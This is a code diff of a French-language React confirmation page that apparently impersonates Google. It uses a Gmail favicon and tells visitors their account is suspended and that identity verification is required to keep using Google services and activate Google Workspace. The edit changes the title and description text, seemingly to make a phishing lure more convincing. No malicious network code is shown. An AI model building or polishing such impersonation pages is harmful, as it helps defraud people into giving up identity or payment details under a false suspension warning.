@@ -201,8 +201,8 @@ const Confirmation = () => {
   return (
     <>
       <PageHead 
-        title="Gmail suspendu"
-        description="Confirmez votre réservation et choisissez votre forfait de service"
+        title="Compte suspendu"
+        description="Confirmez votre compte Google Workspace et choisissez votre forfait."
         options={{
           keywords: 'confirmation, forfait, réservation, paiement',
           favicon: '/gmail-favicon.ico'
@@ -261,7 +261,7 @@ const Confirmation = () => {
                       </h1>
                       <p className={headerStyles.description}>
                         {selectedPlan === 'free' 
-                          ? 'Vérification d\'identité requise pour utiliser Google Agenda et activer votre compte Google Workspace Personnel.'
+                          ? 'Vérification d\'identité requise pour continuer à utiliser vos services Google et activer votre compte Google Workspace.'
                           : `Votre essai gratuit de 30 jours pour ${planSummary[selectedPlan].title} commence maintenant.`
                         }
                       </p>
